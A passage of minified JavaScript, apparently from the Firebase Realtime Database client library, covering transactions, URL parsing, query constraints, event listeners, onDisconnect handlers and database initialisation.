Error(i)).code=e,t(i))}))}function sa(e,t,n){return Ji(e.serverSyncTree_,t,n)||Dn.EMPTY_NODE}function ua(e,t){var n;(t=void 0===t?e.transactionQueueTree_:t)||pa(e,t),wo(t)?(n=ca(e,t),f(0<n.length,"Sending zero length transaction queue"),n.every((function(e){return 0===e.status}))&&function(e,t,n){for(var r=n.map((function(e){return e.currentWriteId})),i=u=sa(e,t,r),o=(r=u.hash(),0);o<n.length;o++){var a=n[o];f(0===a.status,"tryToSendTransactionQueue_: items in queue should all be run."),a.status=1,a.retryCount++;var s=At(t,a.path);i=i.updateChild(s,a.currentOutputSnapshotRaw)}var u=i.val(!0),l=t;e.server_.put(l.toString(),u,(function(r){oa(e,"transaction put response",{path:l.toString(),status:r});var i=[];if("ok"===r){for(var o=[],a=0;a<n.length;a++)!function(t){n[t].status=2,i=i.concat(Yi(e.serverSyncTree_,n[t].currentWriteId)),n[t].onComplete&&o.push((function(){return n[t].onComplete(null,!0,n[t].currentOutputSnapshotResolved)})),n[t].unwatcher()}(a);for(pa(e,mo(e.transactionQueueTree_,t)),ua(e,e.transactionQueueTree_),Vo(e.eventQueue_,t,i),a=0;a<o.length;a++)We(o[a])}else{if("datastale"===r)for(a=0;a<n.length;a++)3===n[a].status?n[a].status=4:n[a].status=0;else for(ke("transaction at "+l.toString()+" failed: "+r),a=0;a<n.length;a++)n[a].status=4,n[a].abortReason=r;la(e,t)}}),r)}(e,Eo(t),n)):bo(t)&&To(t,(function(t){ua(e,t)}))}function la(e,t){var n=ha(e,t);t=Eo(n);return function(e,t,n){if(0!==t.length){for(var r=[],i=[],o=t.filter((function(e){return 0===e.status})).map((function(e){return e.currentWriteId})),a=0;a<t.length;a++)!function(a){var s,u,l,h,c=t[a],p=At(n,c.path),d=!1;f(null!==p,"rerunTransactionsUnderNode_: relativePath should not be null."),4===c.status?(s=c.abortReason,i=i.concat(Yi(e.serverSyncTree_,c.currentWriteId,d=!0))):0===c.status&&(i=c.retryCount>=25?(s="maxretry",i.concat(Yi(e.serverSyncTree_,c.currentWriteId,d=!0))):(u=sa(e,c.path,o),c.currentInputSnapshot=u,void 0!==(h=t[a].update(u.val()))?(Mo("transaction failed: Data returned ",h,c.path),l=Fn(h),"object"==typeof h&&null!=h&&R(h,".priority")||(l=l.updatePriority(u.getPriority())),p=c.currentWriteId,h=$o(e),h=yo(l,u,h),c.currentOutputSnapshotRaw=l,c.currentOutputSnapshotResolved=h,c.currentWriteId=ea(e),o.splice(o.indexOf(p),1),(i=i.concat(Qi(e.serverSyncTree_,c.path,h,c.currentWriteId,c.applyLocally))).concat(Yi(e.serverSyncTree_,p,!0))):(s="nodata",i.concat(Yi(e.serverSyncTree_,c.currentWriteId,d=!0))))),Vo(e.eventQueue_,n,i),i=[],d&&(t[a].status=2,d=t[a].unwatcher,setTimeout(d,Math.floor(0)),t[a].onComplete&&("nodata"===s?r.push((function(){return t[a].onComplete(null,!1,t[a].currentInputSnapshot)})):r.push((function(){return t[a].onComplete(new Error(s),!1,null)}))))}(a);for(pa(e,e.transactionQueueTree_),a=0;a<r.length;a++)We(r[a]);ua(e,e.transactionQueueTree_)}}(e,ca(e,n),t),t}function ha(e,t){for(var n=e.transactionQueueTree_,r=St(t);null!==r&&void 0===wo(n);)n=mo(n,r),r=St(t=Pt(t));return n}function ca(e,t){var n=[];return function e(t,n,r){var i=wo(n);if(i)for(var o=0;o<i.length;o++)r.push(i[o]);To(n,(function(n){e(t,n,r)}))}(e,t,n),n.sort((function(e,t){return e.order-t.order})),n}function pa(e,t){var n=wo(t);if(n){for(var r=0,i=0;i<n.length;i++)2!==n[i].status&&(n[r]=n[i],r++);n.length=r,Co(t,0<n.length?n:void 0)}To(t,(function(t){pa(e,t)}))}function da(e,t){var n=Eo(ha(e,t));return function(e,t,n){for(var r=e.parent;null!==r;){if(t(r))return;r=r.parent}}(t=mo(e.transactionQueueTree_,t),(function(t){fa(e,t)})),fa(e,t),function e(t,n,r,i){r&&!i&&n(t),To(t,(function(t){e(t,n,!0,i)})),r&&i&&n(t)}(t,(function(t){fa(e,t)})),n}function fa(e,t){var n=wo(t);if(n){for(var r=[],i=[],o=-1,a=0;a<n.length;a++)3===n[a].status||(1===n[a].status?(f(o===a-1,"All SENT items should be at beginning of queue."),n[o=a].status=3,n[a].abortReason="set"):(f(0===n[a].status,"Unexpected transaction status in abort"),n[a].unwatcher(),i=i.concat(Yi(e.serverSyncTree_,n[a].currentWriteId,!0)),n[a].onComplete&&r.push(n[a].onComplete.bind(null,new Error("set"),!1,null))));for(-1===o?Co(t,void 0):n.length=o+1,Vo(e.eventQueue_,Eo(t),i),a=0;a<r.length;a++)We(r[a])}}var _a=function(e,t){var n=ya(e),r=n.namespace;return"firebase.com"===n.domain&&Se(n.host+" is no longer supported. Please use <YOUR FIREBASE>.firebaseio.com instead"),r&&"undefined"!==r||"localhost"===n.domain||Se("Cannot parse Firebase url. Please use https://<YOUR FIREBASE>.firebaseio.com"),n.secure||"undefined"!=typeof window&&window.location&&window.location.protocol&&-1!==window.location.protocol.indexOf("https:")&&ke("Insecure Firebase access from a secure page. Please use https in calls to new Firebase()."),e="ws"===n.scheme||"wss"===n.scheme,{repoInfo:new Ge(n.host,n.secure,r,t,e,"",r!==n.subdomain),path:new Tt(n.pathString)}},ya=function(e){var t,n,r,i="",o="",a="",u="",l="",h=!0,c="https",p=443;return"string"==typeof e&&(0<=(r=e.indexOf("//"))&&(c=e.substring(0,r-1),e=e.substring(r+2)),-1===(t=e.indexOf("/"))&&(t=e.length),-1===(n=e.indexOf("?"))&&(n=e.length),i=e.substring(0,Math.min(t,n)),t<n&&(u=function(e){for(var t="",n=e.split("/"),r=0;r<n.length;r++)if(0<n[r].length){var i=n[r];try{i=decodeURIComponent(i.replace(/\+/g," "))}catch(e){}t+="/"+i}return t}(e.substring(t,n))),n=function(e){var t,n,r={};"?"===e.charAt(0)&&(e=e.substring(1));try{for(var i=s(e.split("&")),o=i.next();!o.done;o=i.next()){var a,u=o.value;0!==u.length&&(2===(a=u.split("=")).length?r[decodeURIComponent(a[0])]=decodeURIComponent(a[1]):ke("Invalid query segment '"+u+"' in query '"+e+"'"))}}catch(e){t={error:e}}finally{try{o&&!o.done&&(n=i.return)&&n.call(i)}finally{if(t)throw t.error}}return r}(e.substring(Math.min(e.length,n))),0<=(r=i.indexOf(":"))?(h="https"===c||"wss"===c,p=parseInt(i.substring(r+1),10)):r=i.length,"localhost"===(r=i.slice(0,r)).toLowerCase()?o="localhost":r.split(".").length<=2?o=r:(r=i.indexOf("."),a=i.substring(0,r).toLowerCase(),o=i.substring(r+1),l=a),"ns"in n&&(l=n.ns)),{host:i,port:p,domain:o,subdomain:a,secure:h,scheme:c,pathString:u,namespace:l}},va=(ga.prototype.getPath=function(){var e=this.snapshot.ref;return("value"===this.eventType?e:e.parent)._path},ga.prototype.getEventType=function(){return this.eventType},ga.prototype.getEventRunner=function(){return this.eventRegistration.getEventRunner(this)},ga.prototype.toString=function(){return this.getPath().toString()+":"+this.eventType+":"+N(this.snapshot.exportVal())},ga);function ga(e,t,n,r){this.eventType=e,this.eventRegistration=t,this.snapshot=n,this.prevName=r}var ma=(wa.prototype.getPath=function(){return this.path},wa.prototype.getEventType=function(){return"cancel"},wa.prototype.getEventRunner=function(){return this.eventRegistration.getEventRunner(this)},wa.prototype.toString=function(){return this.path.toString()+":cancel"},wa);function wa(e,t,n){this.eventRegistration=e,this.error=t,this.path=n}var Ca=(ba.prototype.onValue=function(e,t){this.snapshotCallback.call(null,e,t)},ba.prototype.onCancel=function(e){return f(this.hasCancelCallback,"Raising a cancel event on a listener with no cancel callback"),this.cancelCallback.call(null,e)},Object.defineProperty(ba.prototype,"hasCancelCallback",{get:function(){return!!this.cancelCallback},enumerable:!1,configurable:!0}),ba.prototype.matches=function(e){return this.snapshotCallback===e.snapshotCallback||void 0!==this.snapshotCallback.userCallback&&this.snapshotCallback.userCallback===e.snapshotCallback.userCallback&&this.snapshotCallback.context===e.snapshotCallback.context},ba);function ba(e,t){this.snapshotCallback=e,this.cancelCallback=t}var Ta=(Ea.prototype.cancel=function(){var e=new g;return function(e,t,n){e.server_.onDisconnectCancel(t.toString(),(function(r,i){"ok"===r&&function e(t,n){if(Dt(n))return t.value=null,t.children.clear(),!0;if(null!==t.value){if(t.value.isLeafNode())return!1;var r=t.value;return t.value=null,r.forEachChild(bn,(function(e,n){mr(t,new Tt(e),n)})),e(t,n)}return!(0<t.children.size)||(r=St(n),n=Pt(n),t.children.has(r)&&e(t.children.get(r),n)&&t.children.delete(r),0===t.children.size)}(e.onDisconnect_,t),aa(0,n,r,i)}))}(this._repo,this._path,e.wrapCallback((function(){}))),e.promise},Ea.prototype.remove=function(){Wo("OnDisconnect.remove",this._path);var e=new g;return na(this._repo,this._path,null,e.wrapCallback((function(){}))),e.promise},Ea.prototype.set=function(e){Wo("OnDisconnect.set",this._path),Lo("OnDisconnect.set",e,this._path,!1);var t=new g;return na(this._repo,this._path,e,t.wrapCallback((function(){}))),t.promise},Ea.prototype.setWithPriority=function(e,t){Wo("OnDisconnect.setWithPriority",this._path),Lo("OnDisconnect.setWithPriority",e,this._path,!1),No("OnDisconnect.setWithPriority",t,!1);var n,r,i,o,a=new g;return n=this._repo,r=this._path,e=e,t=t,i=a.wrapCallback((function(){})),o=Fn(e,t),n.server_.onDisconnectPut(r.toString(),o.val(!0),(function(e,t){"ok"===e&&mr(n.onDisconnect_,r,o),aa(0,i,e,t)})),a.promise},Ea.prototype.update=function(e){Wo("OnDisconnect.update",this._path),Po("OnDisconnect.update",e,this._path,!1);var t=new g;return function(e,t,n,r){if(D(n))return Ee("onDisconnect().update() called with empty data.  Don't do anything."),aa(0,r,"ok",void 0);e.server_.onDisconnectMerge(t.toString(),n,(function(i,o){"ok"===i&&Oe(n,(function(n,r){r=Fn(r),mr(e.onDisconnect_,Ot(t,n),r)})),aa(0,r,i,o)}))}(this._repo,this._path,e,t.wrapCallback((function(){}))),t.promise},Ea);function Ea(e,t){this._repo=e,this._path=t}var Ia=(Object.defineProperty(Sa.prototype,"key",{get:function(){return Dt(this._path)?null:Nt(this._path)},enumerable:!1,configurable:!0}),Object.defineProperty(Sa.prototype,"ref",{get:function(){return new Ra(this._repo,this._path)},enumerable:!1,configurable:!0}),Object.defineProperty(Sa.prototype,"_queryIdentifier",{get:function(){var e=pr(this._queryParams);return"{}"===(e=Re(e))?"default":e},enumerable:!1,configurable:!0}),Object.defineProperty(Sa.prototype,"_queryObject",{get:function(){return pr(this._queryParams)},enumerable:!1,configurable:!0}),Sa.prototype.isEqual=function(e){if(!((e=B(e))instanceof Sa))return!1;var t=this._repo===e._repo,n=Mt(this._path,e._path);e=this._queryIdentifier===e._queryIdentifier;return t&&n&&e},Sa.prototype.toJSON=function(){return this.toString()},Sa.prototype.toString=function(){return this._repo.toString()+function(e){for(var t="",n=e.pieceNum_;n<e.pieces_.length;n++)""!==e.pieces_[n]&&(t+="/"+encodeURIComponent(String(e.pieces_[n])));return t||"/"}(this._path)},Sa);function Sa(e,t,n,r){this._repo=e,this._path=t,this._queryParams=n,this._orderByCalled=r}function ka(e,t){if(!0===e._orderByCalled)throw new Error(t+": You can't combine multiple orderBy calls.")}function Pa(e){var t=null,n=null;if(e.hasStart()&&(t=e.getIndexStartValue()),e.hasEnd()&&(n=e.getIndexEndValue()),e.getIndex()===tn){var r="Query: When ordering by key, you may only pass one argument to startAt(), endAt(), or equalTo().",i="Query: When ordering by key, the argument passed to startAt(), startAfter(), endAt(), endBefore(), or equalTo() must be a string.";if(e.hasStart()){if(e.getIndexStartName()!==Pe)throw new Error(r);if("string"!=typeof t)throw new Error(i)}if(e.hasEnd()){if(e.getIndexEndName()!==Ne)throw new Error(r);if("string"!=typeof n)throw new Error(i)}}else if(e.getIndex()===bn){if(null!=t&&!Ao(t)||null!=n&&!Ao(n))throw new Error("Query: When ordering by priority, the first argument passed to startAt(), startAfter() endAt(), endBefore(), or equalTo() must be a valid priority value (null, a number, or a string).")}else if(f(e.getIndex()instanceof jn||e.getIndex()===Yn,"unknown index type."),null!=t&&"object"==typeof t||null!=n&&"object"==typeof n)throw new Error("Query: First argument passed to startAt(), startAfter(), endAt(), endBefore(), or equalTo() cannot be an object.")}function Na(e){if(e.hasStart()&&e.hasEnd()&&e.hasLimit()&&!e.hasAnchoredLimit())throw new Error("Query: Can't combine startAt(), startAfter(), endAt(), endBefore(), and limit(). Use limitToFirst() or limitToLast() instead.")}var xa,Ra=(r(Oa,xa=Ia),Object.defineProperty(Oa.prototype,"parent",{get:function(){var e=Rt(this._path);return null===e?null:new Oa(this._repo,e)},enumerable:!1,configurable:!0}),Object.defineProperty(Oa.prototype,"root",{get:function(){for(var e=this;null!==e.parent;)e=e.parent;return e},enumerable:!1,configurable:!0}),Oa);function Oa(e,t){return xa.call(this,e,t,new ar,!1)||this}var Da=(Object.defineProperty(Aa.prototype,"priority",{get:function(){return this._node.getPriority().val()},enumerable:!1,configurable:!0}),Object.defineProperty(Aa.prototype,"key",{get:function(){return this.ref.key},enumerable:!1,configurable:!0}),Object.defineProperty(Aa.prototype,"size",{get:function(){return this._node.numChildren()},enumerable:!1,configurable:!0}),Aa.prototype.child=function(e){var t=new Tt(e);e=Fa(this.ref,e);return new Aa(this._node.getChild(t),e,bn)},Aa.prototype.exists=function(){return!this._node.isEmpty()},Aa.prototype.exportVal=function(){return this._node.val(!0)},Aa.prototype.forEach=function(e){var t=this;return!this._node.isLeafNode()&&!!this._node.forEachChild(this._index,(function(n,r){return e(new Aa(r,Fa(t.ref,n),bn))}))},Aa.prototype.hasChild=function(e){return e=new Tt(e),!this._node.getChild(e).isEmpty()},Aa.prototype.hasChildren=function(){return!this._node.isLeafNode()&&!this._node.isEmpty()},Aa.prototype.toJSON=function(){return this.exportVal()},Aa.prototype.val=function(){return this._node.val()},Aa);function Aa(e,t,n){this._node=e,this.ref=t,this._index=n}function La(e,t){return(e=B(e))._checkNotDeleted("ref"),void 0!==t?Fa(e._root,t):e._root}function Ma(e,t){(e=B(e))._checkNotDeleted("refFromURL");var n=_a(t,e._repo.repoInfo_.nodeAdmin);return jo("refFromURL",n),t=n.repoInfo,e._repo.repoInfo_.isCustomHost()||t.host===e._repo.repoInfo_.host||Se("refFromURL: Host name does not match the current database: (found "+t.host+" but expected "+e._repo.repoInfo_.host+")"),La(e,n.path.toString())}function Fa(e,t){return(null===St((e=B(e))._path)?qo:Fo)("child","path",t,!1),new Ra(e._repo,Ot(e._path,t))}function qa(e,t){e=B(e),Wo("set",e._path),Lo("set",t,e._path,!1);var n=new g;return ta(e._repo,e._path,t,null,n.wrapCallback((function(){}))),n.promise}function Wa(e,t){Po("update",t,e._path,!1);var n=new g;return function(e,t,n,r){oa(e,"update",{path:t.toString(),value:n});var i,o,a=!0,s=$o(e),u={};Oe(n,(function(n,r){a=!1,u[n]=_o(Ot(t,n),Fn(r),e.serverSyncTree_,s)})),a?(Ee("update() called with empty data.  Don't do anything."),aa(0,r,"ok",void 0)):(i=ea(e),o=function(e,t,n,r){var i,o,a;return i=e.pendingWriteTree_,o=t,a=n,f((r=r)>i.lastWriteId,"Stacking an older merge on top of newer ones"),i.allWrites.push({path:o,children:a,writeId:r,visible:!0}),i.visibleWrites=$r(i.visibleWrites,o,a),i.lastWriteId=r,n=Hr.fromObject(n),Xi(e,new Dr({fromUser:!0,fromServer:!1,queryId:null,tagged:!1},t,n))}(e.serverSyncTree_,t,u,i),Bo(e.eventQueue_,o),e.server_.merge(t.toString(),n,(function(n,o){(s="ok"===n)||ke("update at "+t+" failed: "+n);var a=Yi(e.serverSyncTree_,i,!s),s=0<a.length?la(e,t):t;Vo(e.eventQueue_,s,a),aa(0,r,n,o)})),Oe(n,(function(n){n=da(e,Ot(t,n)),la(e,n)})),Vo(e.eventQueue_,t,[]))}(e._repo,e._path,t,n.wrapCallback((function(){}))),n.promise}function ja(e){return e=B(e),t=e._repo,n=e,(null!=(r=function(e,t){var n=t._path,r=null;e.syncPointTree_.foreachOnPath(n,(function(e,t){e=At(e,n),r=r||Wi(t,e)}));var i=e.syncPointTree_.get(n);i?r=r||Wi(i,It()):(i=new Li,e.syncPointTree_=e.syncPointTree_.set(n,i));var o=null!=r,a=o?new Lr(r,!0,!1):null;return zr(Fi(i,t,ii(e.pendingWriteTree_,t._path),o?a.getNode():Dn.EMPTY_NODE,o).viewCache_)}(t.serverSyncTree_,n))?Promise.resolve(r):t.server_.get(n).then((function(e){var r=Fn(e).withIndex(n._queryParams.getIndex());e=Ki(t.serverSyncTree_,n._path,r);return zo(t.eventQueue_,n._path,e),Promise.resolve(r)}),(function(e){return oa(t,"get for query "+N(n)+" failed: "+e),Promise.reject(new Error(e))}))).then((function(t){return new Da(t,new Ra(e._repo,e._path),e._queryParams.getIndex())}));var t,n,r}var Ua=(Ba.prototype.respondsTo=function(e){return"value"===e},Ba.prototype.createEvent=function(e,t){var n=t._queryParams.getIndex();return new va("value",this,new Da(e.snapshotNode,new Ra(t._repo,t._path),n))},Ba.prototype.getEventRunner=function(e){var t=this;return"cancel"===e.getEventType()?function(){return t.callbackContext.onCancel(e.error)}:function(){return t.callbackContext.onValue(e.snapshot,null)}},Ba.prototype.createCancelEvent=function(e,t){return this.callbackContext.hasCancelCallback?new ma(this,e,t):null},Ba.prototype.matches=function(e){return e instanceof Ba&&(!e.callbackContext||!this.callbackContext||e.callbackContext.matches(this.callbackContext))},Ba.prototype.hasAnyCallback=function(){return null!==this.callbackContext},Ba);function Ba(e){this.callbackContext=e}var za=(Va.prototype.respondsTo=function(e){return e="children_added"===e?"child_added":e,this.eventType===("children_removed"===e?"child_removed":e)},Va.prototype.createCancelEvent=function(e,t){return this.callbackContext.hasCancelCallback?new ma(this,e,t):null},Va.prototype.createEvent=function(e,t){f(null!=e.childName,"Child events should have a childName.");var n=Fa(new Ra(t._repo,t._path),e.childName);t=t._queryParams.getIndex();return new va(e.type,this,new Da(e.snapshotNode,n,t),e.prevName)},Va.prototype.getEventRunner=function(e){var t=this;return"cancel"===e.getEventType()?function(){return t.callbackContext.onCancel(e.error)}:function(){return t.callbackContext.onValue(e.snapshot,e.prevName)}},Va.prototype.matches=function(e){return e instanceof Va&&this.eventType===e.eventType&&(!this.callbackContext||!e.callbackContext||this.callbackContext.matches(e.callbackContext))},Va.prototype.hasAnyCallback=function(){return!!this.callbackContext},Va);function Va(e,t){this.eventType=e,this.callbackContext=t}function Ha(e,t,n,r,i){var o;"object"==typeof r&&(a=void 0,i=r),"function"==typeof r&&(a=r),i&&i.onlyOnce&&((i=function(t,n){ra(e._repo,e,s),o(t,n)}).userCallback=(o=n).userCallback,i.context=n.context,n=i);n=new Ca(n,a||void 0);var a,s="value"===t?new Ua(n):new za(t,n);return a=e._repo,t=s,t=".info"===St((n=e)._path)?$i(a.infoSyncTree_,n,t):$i(a.serverSyncTree_,n,t),zo(a.eventQueue_,n._path,t),function(){return ra(e._repo,e,s)}}function Qa(e,t,n,r){return Ha(e,"value",t,n,r)}function Ya(e,t,n,r){return Ha(e,"child_added",t,n,r)}function Ka(e,t,n,r){return Ha(e,"child_changed",t,n,r)}function Ga(e,t,n,r){return Ha(e,"child_moved",t,n,r)}function $a(e,t,n,r){return Ha(e,"child_removed",t,n,r)}function Ja(e,t,n){var r=null;n=n?new Ca(n):null;"value"===t?r=new Ua(n):t&&(r=new za(t,n)),ra(e._repo,e,r)}var Xa,Za=(r(es,Xa=yt=function(){}),es.prototype._apply=function(e){Lo("endAt",this._value,e._path,!0);var t=lr(e._queryParams,this._value,this._key);if(Na(t),Pa(t),e._queryParams.hasEnd())throw new Error("endAt: Starting point was already set (by another call to endAt, endBefore or equalTo).");return new Ia(e._repo,e._path,t,e._orderByCalled)},es);function es(e,t){var n=Xa.call(this)||this;return n._value=e,n._key=t,n}var ts,ns=(r(rs,ts=yt),rs.prototype._apply=function(e){var t,n,r;if(Lo("endBefore",this._value,e._path,!1),Na(r=(t=e._queryParams,n=this._value,r=this._key,(r=t.index_===tn?lr(t,n="string"==typeof n?Vn(n):n,r):lr(t,n,null==r?Pe:Vn(r))).endBeforeSet_=!0,r)),Pa(r),e._queryParams.hasEnd())throw new Error("endBefore: Starting point was already set (by another call to endAt, endBefore or equalTo).");return new Ia(e._repo,e._path,r,e._orderByCalled)},rs);function rs(e,t){var n=ts.call(this)||this;return n._value=e,n._key=t,n}var is,os=(r(as,is=yt),as.prototype._apply=function(e){Lo("startAt",this._value,e._path,!0);var t=ur(e._queryParams,this._value,this._key);if(Na(t),Pa(t),e._queryParams.hasStart())throw new Error("startAt: Starting point was already set (by another call to startAt, startBefore or equalTo).");return new Ia(e._repo,e._path,t,e._orderByCalled)},as);function as(e,t){var n=is.call(this)||this;return n._value=e,n._key=t,n}var ss,us=(r(ls,ss=yt),ls.prototype._apply=function(e){var t,n,r;if(Lo("startAfter",this._value,e._path,!1),Na(r=(t=e._queryParams,n=this._value,r=this._key,(r=t.index_===tn?ur(t,n="string"==typeof n?zn(n):n,r):ur(t,n,null==r?Ne:zn(r))).startAfterSet_=!0,r)),Pa(r),e._queryParams.hasStart())throw new Error("startAfter: Starting point was already set (by another call to startAt, startAfter, or equalTo).");return new Ia(e._repo,e._path,r,e._orderByCalled)},ls);function ls(e,t){var n=ss.call(this)||this;return n._value=e,n._key=t,n}var hs,cs=(r(ps,hs=yt),ps.prototype._apply=function(e){if(e._queryParams.hasLimit())throw new Error("limitToFirst: Limit was already set (by another call to limitToFirst or limitToLast).");return new Ia(e._repo,e._path,(t=e._queryParams,n=this._limit,(t=t.copy()).limitSet_=!0,t.limit_=n,t.viewFrom_="l",t),e._orderByCalled);var t,n},ps);function ps(e){var t=hs.call(this)||this;return t._limit=e,t}var ds,fs=(r(_s,ds=yt),_s.prototype._apply=function(e){if(e._queryParams.hasLimit())throw new Error("limitToLast: Limit was already set (by another call to limitToFirst or limitToLast).");return new Ia(e._repo,e._path,(t=e._queryParams,n=this._limit,(t=t.copy()).limitSet_=!0,t.limit_=n,t.viewFrom_="r",t),e._orderByCalled);var t,n},_s);function _s(e){var t=ds.call(this)||this;return t._limit=e,t}var ys,vs=(r(gs,ys=yt),gs.prototype._apply=function(e){ka(e,"orderByChild");var t=new Tt(this._path);if(Dt(t))throw new Error("orderByChild: cannot pass in empty path. Use orderByValue() instead.");return t=new jn(t),Pa(t=hr(e._queryParams,t)),new Ia(e._repo,e._path,t,!0)},gs);function gs(e){var t=ys.call(this)||this;return t._path=e,t}var ms,ws=(r(Cs,ms=yt),Cs.prototype._apply=function(e){ka(e,"orderByKey");var t=hr(e._queryParams,tn);return Pa(t),new Ia(e._repo,e._path,t,!0)},Cs);function Cs(){return null!==ms&&ms.apply(this,arguments)||this}var bs,Ts=(r(Es,bs=yt),Es.prototype._apply=function(e){ka(e,"orderByPriority");var t=hr(e._queryParams,bn);return Pa(t),new Ia(e._repo,e._path,t,!0)},Es);function Es(){return null!==bs&&bs.apply(this,arguments)||this}var Is,Ss=(r(ks,Is=yt),ks.prototype._apply=function(e){ka(e,"orderByValue");var t=hr(e._queryParams,Yn);return Pa(t),new Ia(e._repo,e._path,t,!0)},ks);function ks(){return null!==Is&&Is.apply(this,arguments)||this}var Ps,Ns,xs,Rs=(r(Os,Ps=yt),Os.prototype._apply=function(e){if(Lo("equalTo",this._value,e._path,!1),e._queryParams.hasStart())throw new Error("equalTo: Starting point was already set (by another call to startAt/startAfter or equalTo).");if(e._queryParams.hasEnd())throw new Error("equalTo: Ending point was already set (by another call to endAt/endBefore or equalTo).");return new Za(this._value,this._key)._apply(new os(this._value,this._key)._apply(e))},Os);function Os(e,t){var n=Ps.call(this)||this;return n._value=e,n._key=t,n}function Ds(e){for(var t,n,r=[],i=1;i<arguments.length;i++)r[i-1]=arguments[i];var o=B(e);try{for(var a=s(r),u=a.next();!u.done;u=a.next())o=u.value._apply(o)}catch(e){t={error:e}}finally{try{u&&!u.done&&(n=a.return)&&n.call(a)}finally{if(t)throw t.error}}return o}Ns=Ra,f(!ki,"__referenceConstructor has already been defined"),ki=Ns,xs=Ra,f(!Ai,"__referenceConstructor has already been defined"),Ai=xs;var As={},Ls=!1;function Ms(e,t,n,r,i){var o=r||e.options.databaseURL;void 0===o&&(e.options.projectId||Se("Can't determine Firebase Database URL. Be sure to include  a Project ID when calling firebase.initializeApp()."),Ee("Using default host for project ",e.options.projectId),o=e.options.projectId+"-default-rtdb.firebaseio.com");var a,s=_a(o,i),u=s.repoInfo;r=void 0;return(r="undefined"!=typeof process?process.env.FIREBASE_DATABASE_EMULATOR_HOST:r)?(a=!0,o="http://"+r+"?ns="+u.namespace,u=(s=_a(o,i)).repoInfo):a=!s.repoInfo.secure,t=i&&a?new Ve(Ve.OWNER):new Be(e.name,e.options,t),jo("Invalid Firebase Database URL",s),Dt(s.path)||Se("Database URL must point to the root of a Firebase Database (not including a child path)."),n=function(e,t,n,r){var i=As[t.name];return i||(i={},As[t.name]=i),(t=i[e.toURLString()])&&Se("Database initialized multiple times. Please make sure the format of the database URL matches with each database() call."),t=new Yo(e,Ls,n,r),i[e.toURLString()]=t}(u,e,t,new je(e.name,n)),new Fs(n,e)}var Fs=(Object.defineProperty(qs.prototype,"_repo",{get:function(){return this._instanceStarted||(function(e,t,n){if(e.stats_=nt(e.repoInfo_),e.forceRestClient_||0<=("object"==typeof window&&window.navigator&&window.navigator.userAgent||"").search(/googlebot|google webmaster tools|bingbot|yahoo! slurp|baiduspider|yandexbot|duckduckbot/i))e.server_=new fr(e.repoInfo_,(function(t,n,r,i){Jo(e,t,n,r,i)}),e.authTokenProvider_,e.appCheckProvider_),setTimeout((function(){return Xo(e,!0)}),0);else{if(null!=n){if("object"!=typeof n)throw new Error("Only objects are supported for option databaseAuthVariableOverride");try{N(n)}catch(t){throw new Error("Invalid authOverride provided: "+t)}}e.persistentConnection_=new Qt(e.repoInfo_,t,(function(t,n,r,i){Jo(e,t,n,r,i)}),(function(t){Xo(e,t)}),(function(t){var n;n=e,Oe(t,(function(e,t){Zo(n,e,t)}))}),e.authTokenProvider_,e.appCheckProvider_,n),e.server_=e.persistentConnection_}e.authTokenProvider_.addTokenChangeListener((function(t){e.server_.refreshAuthToken(t)})),e.appCheckProvider_.addTokenChangeListener((function(t){e.server_.refreshAppCheckToken(t.token)})),e.statsReporter_=(n=function(){return new Er(e.stats_,e.server_)},t=(t=e.repoInfo_).toString(),tt[t]||(tt[t]=n()),tt[t]),e.infoData_=new yr,e.infoSyncTree_=new Hi({startListening:function(t,n,r,i){var o=[],a=e.infoData_.getNode(t._path);return a.isEmpty()||(o=Ki(e.infoSyncTree_,t._path,a),setTimeout((function(){i("ok")}),0)),o},stopListening:function(){}}),Zo(e,"connected",!1),e.serverSyncTree_=new Hi({startListening:function(t,n,r,i){return e.server_.listen(t,r,n,(function(n,r){r=i(n,r),Vo(e.eventQueue_,t._path,r)})),[]},stopListening:function(t,n){e.server_.unlisten(t,n)}})}(this._repoInternal,this.app.options.appId,this.app.options.databaseAuthVariableOverride),this._instanceStarted=!0),this._repoInternal},enumerable:!1,configurable:!0}),Object.defineProperty(qs.prototype,"_root",{get:function(){return this._rootInternal||(this._rootInternal=new Ra(this._repo,It())),this._rootInternal},enumerable:!1,configurable:!0}),qs.prototype._delete=function(){var e,t,n;return null!==this._rootInternal&&(e=this._repo,t=this.app.name,(n=As[t])&&n[e.key]===e||Se("Database "+t+"("+e.repoInfo_+") has already been deleted."),ia(e),delete n[e.key],this._repoInternal=null,this._rootInternal=null),Promise.resolve()},qs.prototype._checkNotDeleted=function(e){null===this._rootInternal&&Se("Cannot call "+e+" on a deleted database.")},qs);function qs(e,t){this._repoInternal=e,this.app=t,this.type="database",this._instanceStarted=!1}function Ws(e){(e=B(e))._checkNotDeleted("goOnline"),(e=e._repo).persistentConnection_&&e.persistentConnection_.resume(Qo)}var js=(Us.prototype.toJSON=function(){return{committed:this.committed,snapshot:this.snapshot.toJSON()}},Us);function Us(e,t){this.committed=e,this.snapshot=t}function Bs(e,t,n){if(e=B(e),Wo("Reference.transaction",e._path),".length"===e.key||".keys"===e.key)throw"Reference.transaction failed: "+e.key+" is a read-only object.";n=null===(i=null==n?void 0:n.applyLocally)||void 0===i||i;var r=new g,i=Qa(e,(function(){}));return function(e,t,n,r,i,o){oa(e,"transaction on "+t);var a={path:t,update:n,onComplete:r,status:null,order:we(),applyLocally:o,retryCount:0,unwatcher:i,abortReason:null,currentWriteId:null,currentInputSnapshot:null,currentOutputSnapshotRaw:null,currentOutputSnapshotResolved:null};n=sa(e,t,void 0);a.currentInputSnapshot=n,void 0===(r=a.update(n.val()))?(a.unwatcher(),a.currentOutputSnapshotRaw=null,a.currentOutputSnapshotResolved=null,a.onComplete&&a.onComplete(null,!1,a.currentInputSnapshot)):(Mo("transaction failed: Data returned ",r,a.path),a.status=0,(i=wo(o=mo(e.transactionQueueTree_,t))||[]).push(a),Co(o,i),o=void 0,"object"==typeof r&&null!==r&&R(r,".priority")?(o=O(r,".priority"),f(Ao(o),"Invalid priority returned by transaction. Priority must be a valid string, finite number, server value, or null.")):o=(Ji(e.serverSyncTree_,t)||Dn.EMPTY_NODE).getPriority().val(),i=$o(e),o=Fn(r,o),i=yo(o,n,i),a.currentOutputSnapshotRaw=o,a.currentOutputSnapshotResolved=i,a.currentWriteId=ea(e),a=Qi(e.serverSyncTree_,t,i,a.currentWriteId,a.applyLocally),Vo(e.eventQueue_,t,a),ua(e,e.transactionQueueTree_))}(e._repo,e._path,t,(function(t,n,i){var o;t?r.reject(t):(o=new Da(i,new Ra(e._repo,e._path),bn),r.resolve(new js(n,o)))}),i,n),r.promise}var 